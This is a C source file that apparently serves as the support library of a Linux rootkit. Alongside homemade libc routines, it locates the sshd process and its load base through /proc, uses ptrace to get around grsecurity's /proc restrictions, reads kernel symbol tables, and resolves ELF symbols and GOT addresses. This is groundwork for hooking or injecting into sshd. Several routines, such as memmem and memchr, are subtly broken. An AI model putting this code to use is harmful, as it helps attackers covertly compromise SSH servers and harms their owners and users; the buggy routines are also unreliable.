#include <stdarg.h>
#include <cdefs.h>
#include <unistd.h>
#include <libc.h>
#include <libio.h>
#include <elf.h>

static int optind = 1;
char *optarg;

void
memset(char *s, int c, unsigned int size)
{
	register unsigned int i;
	for (i = 0; i < size; i++) {
		*s++ = c;
	}
}

char *
strstr(char *haystack, char *needle)
{
	char *hptr, *nptr;
	if (*needle == 0)
		return haystack;
	while (*haystack) {
		if (*haystack++ != *needle)
			continue;
		hptr = haystack;
		nptr = needle + 1;
		while (1) {
			if (*nptr == 0)
				return haystack - 1;
			if (*hptr++ != *nptr++)
				break;
		}
	}
	return 0;
}

void *
memchr(void *s, unsigned char c, unsigned long n)
{
	unsigned char *p = (unsigned char *)s;
	do {
		if (*p++ == c)
			return ((void *)(p - 1));
	} while (--n != 0);
}

void
memcpy(void *dst, void *src, unsigned long n)
{
	register unsigned long i = 0;
	for (; i<n; i++) {
		*(unsigned char *)dst++=*(unsigned char *)src++;
	}
}

void *
memmem(void *haystack, unsigned long h_size, void *needle, unsigned long n_size)
{
	register unsigned long i,j;
	for(i=0;i<h_size;i++) {
		if(j==n_size)
			return (haystack+i-1);
			for(j=0;j<n_size;j++)
			if(*(unsigned char *)(haystack+i+j)!=*(unsigned char *)(needle+j))
				break;
	}
	return ((void *)0);
}

unsigned char *mapfile(char *path, unsigned long *lenptr)
{
	struct stat sb;
	char *fp;
	int fd;

	if (stat(path, &sb) == -1)
		return (NULL);

	fd  = open(path, O_RDONLY, 0);
	*lenptr = sb.st_size;
	fp  = (unsigned char *) mmap(NULL, *lenptr, PROT_READ, MAP_PRIVATE, fd, 0);
	if (fp == (void *)-1)
		return (NULL);
	return (fp);
}

unsigned char *maplib(char *lib, int pid, unsigned long *lenptr)
{
	struct stat sb;
	int fd, len;
	char path[256] = {0};
	char lpath[256] = {0};
	char buf[256];
	char *fp, *p, *l;

	sprintf(path, "/proc/%d/maps", pid);
	fd = open(path, O_RDONLY, 0);
	if (fd < 0)
		return (NULL);

	len = rkstrlen(lib);
	while (readline(buf, fd) != -1) {
		p = strstr(buf, lib);
		if (!p)
			continue;
		if (!memchr(buf, 'x', 32))
			continue;
		l = memchr(buf, '/', rkstrlen(buf));
		p = strstr(l, lib);
		p += len;
		*p = 0;
		rkstrcpy(lpath, l);
		printf("lpath: %s\n", lpath);
		close(fd);
		break;
	}
	if (stat(lpath, &sb) < 0)
		return (NULL);

	*lenptr = sb.st_size;	
	fd = open(lpath, O_RDONLY, 0);
	fp = mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (fp == (void *)-1)
		return (NULL);
	return (fp);
}

int
opensyms(void)
{
	char path[256] = { "/boot/System.map-" };
	struct utsname un;
	struct stat sb;
	int fd;
	uname(&un);
	rkstrcat(path, un.release);

	fd = open(path, O_RDONLY, 0);
	if (fd > 2)
		return fd;
	fd = open("/proc/kallsyms", O_RDONLY, 0);
	return fd;
}

int
procfslookup(char *cmd, char *exec)
{
	char buf[8192];
	char path[64];
	char cmdline[256];
	int reclen, pos, fd, pfd;
	struct dirent64 *d;

	pfd = open("/proc", O_RDONLY, 0);
	for (;;) {
		reclen = getdents64(pfd, buf, sizeof(buf));
		if (!reclen || reclen < 0)
			break;
		for (pos = 0; pos < reclen;) {
			d = (struct dirent64 *)(buf+pos);
			if (*d->d_name > '0' && *d->d_name <= '9') {
				memset (path,    '\0', sizeof(path));
				memset (cmdline, '\0', sizeof(cmdline));
				sprintf(path, "/proc/%s/cmdline", d->d_name);
				fd = open(path, O_RDONLY, 0);
				read(fd, cmdline, sizeof(cmdline)-1);
				close(fd);
				if (*(char *)cmdline == '/') {
					if (strstr(cmdline, cmd)) {
						rkstrcpy(exec, cmdline);
						close(pfd);
						return rkatoi(d->d_name);
					}
				}
			}
			pos += d->d_reclen;
		}
	}
	close(pfd);
	return (0);
}

unsigned int
procfs_auxv2(int pid, unsigned long *base, unsigned long entry)
{
	ELF_AUXV *auxv;
	char buf[1024];
	char path[64];
	int fd, n;

	sprintf(path, "/proc/%d/auxv", pid);
	fd = open(path, O_RDONLY, 0);
	if (fd < 0)
		return 0;

	n = read(fd, buf, sizeof(buf));
	if (n < 0) {
		/* GRSEC /proc/pid/auxv restrictions. We must PT_ATTACH */
		if (ptrace(PTRACE_ATTACH, pid, 0, 0)) {
			printf("procfs_auxv: Couldn't attach to pid %d\n", pid);
			return 0;
		}
		read(fd, buf, sizeof(buf));
	}

	auxv = (ELF_AUXV *)buf;
	for (; auxv->a_type != AT_NULL; auxv++) {
		if (auxv->a_type == AT_ENTRY) {
			printf("AT_ENTRY: 0x%x\n", auxv->a_val);
			if (n < 0) {
				ptrace(PTRACE_DETACH, pid, 0, 0);
			}
			(*base) = (auxv->a_val-entry);
		}
	}
	return 1;
}

int
procfs_base(int pid, char *cmd, unsigned long *base, unsigned long entry)
{
	char buf[4096];
	char path[64];
	char *p;
	int fd;

	sprintf(path, "/proc/%d/maps", pid);
	fd = open(path, O_RDONLY, 0);
	if (fd < 0)
		return 0;

	while (readline(buf, fd) != -1) {
		p = strstr(buf, "/sshd");
		if (!p)
			continue;
		if (!memchr(buf, 'x', 32))
			continue;
		p = memchr(buf, '-', 20);
		*p = 0;
		*base = rkstrtoul(buf, 16);
		break;
	}

	if (!(*base)) {
		printf("/proc/pid/maps restrictions...trying AUX\n");
		if (!procfs_auxv2(pid, base, entry))
			return 0;
	}
	return (1);
}


void
elf_lookup2(struct elfarg *elfargs)
{	
	unsigned long base = elfargs->base;
	unsigned char *map = elfargs->map;
	ELF_EHDR *ehdr = (ELF_EHDR *)(map);
	ELF_SHDR *shdr = (ELF_SHDR *)(map+ehdr->e_shoff);
	ELF_SYM  *symtab;
	ELF_SHDR *shdrstr;
	char *shstrtab, *strtab = NULL;
	int shnum, x, i, n = 0;
	int nsyms = elfargs->nsyms;
printf("map: %x\n", elfargs->map);
	shnum    = ehdr->e_shnum;
	shdrstr  = shdr+ehdr->e_shstrndx;
	shstrtab = (char *)map+(shdrstr->sh_offset);
	for (i = 0; i < shnum; i++) {
		char *str = shstrtab+(shdr->sh_name);
		if (shdr->sh_type == SHT_STRTAB) {
			if ((!rkstrcmp(str, ".dynstr") && !base) ||
				(!rkstrcmp(str, ".strtab") &&  base)) {
				strtab = (char *)(map+shdr->sh_offset);
				printf("str: %s\n", str);
			}
		}
		if (shdr->sh_type == SHT_PROGBITS) {
			if (!rkstrcmp(str, ".got")) {
				if (elfargs->ebx) {
					*elfargs->ebx = shdr->sh_offset;
					*elfargs->gotaddr = shdr->sh_addr;
				}
			}
		}
		if (shdr->sh_type == SHT_PROGBITS) {
			if (!rkstrcmp(str, ".got.plt")) {
				if (elfargs->ebx) {
					*elfargs->ebx = shdr->sh_offset;
					*elfargs->gotaddr = shdr->sh_addr;
				}
			}
		}
		if ((shdr->sh_type == SHT_DYNSYM && !base) ||
			(shdr->sh_type == SHT_SYMTAB &&  base)) {
			symtab = (ELF_SYM *)(map+shdr->sh_offset);
			n = shdr->sh_size/sizeof(*symtab);
			if (strtab) {
				break;
			}
		}
		shdr++;
	}
	for (i = 0; i < n; i++) {
		char *s = strtab+symtab->st_name;
		for (x = 0; x < nsyms; x++) {
			if (!rkstrcmp(s, elfargs->syms[x].name)) {
				printf("{%s} 0x%x\n", s, symtab->st_value);
				elfargs->syms[x++].addr = symtab->st_value;
			}
		}
		symtab++;
	}
}

unsigned int
rkinet4addr(char *ip)
{
	char *pos,*pos2,*pos3;
	int a1,a2,a3,a4;
	unsigned int ipaddr;

	pos = rkstrchr(ip, '.');
	if ((!pos) || (pos-ip > 3))
		return -1;

	*pos=0;
	a1 = rkatoi(ip);
	pos2 = rkstrchr(pos+1, '.');
	if ((!pos2) || (pos2-(pos+1) > 3))
		return -1;

	*pos2=0;
	a2 = rkatoi(pos+1);
	pos3 = rkstrchr(pos2+1, '.');
	if ((!pos3) || (pos3-(pos2+1) > 3))
		return -1;

	*pos3=0;
	a3 = rkatoi(pos2+1);
	if (rkstrlen(pos3+1) > 3)
		return -1;

	a4 = rkatoi(pos3+1);
	((char *)&ipaddr)[0] = a1;
	((char *)&ipaddr)[1] = a2;
	((char *)&ipaddr)[2] = a3;
	((char *)&ipaddr)[3] = a4;
	return (ipaddr);
}

int
readline(char *s, int fd)
{
	int len, n;
	char c;

	c = 0;
	len = 0;
	while (1) {
		n = read(fd, &c, 1);
		if (n <= 0)
			return -1;
		if (c == '\n') {
			*s = '\0';
			return (len);
		}
		else {
			*s++ = c;
			len++;
		}
	}
}

int
getopt(int argc, char **argv, char *optstr)
{
	char *opt, c;

	if (argc <= optind)
		return 0;

	if (argv[optind][0] != '-' || !argv[optind][1]) {
		return -1;
	}

	c = argv[optind][1];
	if (!(opt=rkstrchr(optstr, c))) {
		return -1;
	}
	/* opt has no args */
	if (*(opt+1) != ':') {
		optarg = NULL;
		optind++;
		return (c);
	}

	if (argc <= ++optind)
		return 0;

	if (argv[optind][2]) {
		optarg = &argv[optind][0];
		optind++;
	}
	return (c);
}

void
__putchar(char *str, char *s, int io)
{
	if (io)
		write(1, s, 1);
	else
		*str = *s;
}

int
__putstr(char *s, int len, int iomode, char *str)
{
	if (iomode)
		write(1, s, len);
	else
		memcpy(str, s, len);
	return (len);
}

void
rkprintf(unsigned char *fmt, int io, char *str, va_list ap)
{
	char b[32] = {0};
	char *arg, *ptr, c;
	int n = 0;

	for (;;) {
		ptr = (char *)str+n;
		while ((c = *(unsigned char *)fmt++) != '%') {
			if (c == '\0')
				return;
			__putchar(ptr++, &c, io);
			n++;
		}
		switch (c = *fmt++) {
			case 'd':
				n += __putstr(b, rkitoa(b, va_arg(ap, unsigned long), 10)-1, io, str+n);
				break;
			case 'x':
				n += __putstr(b, rkitoa(b, va_arg(ap, unsigned long), 16)-1, io, str+n);
				break;
			case 's':
				arg = va_arg(ap, char *);
				n += __putstr(arg, rkstrlen(arg), io, str+n);
				break;
			case 'c':
				c = va_arg(ap, int);
				__putchar(fmt, &c, io);
				n++;
				break;
			case 'p':
				n += __putstr(b, rkitoa(b, va_arg(ap, unsigned long), 16)-1, io, str+n);
				break;
		}
	}
}

void
sprintf(char *str, char *fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	rkprintf(fmt, 0, str, ap);
	va_end(ap);
}
void
printf(char *fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	rkprintf(fmt, 1, NULL, ap);
	va_end(ap);
}
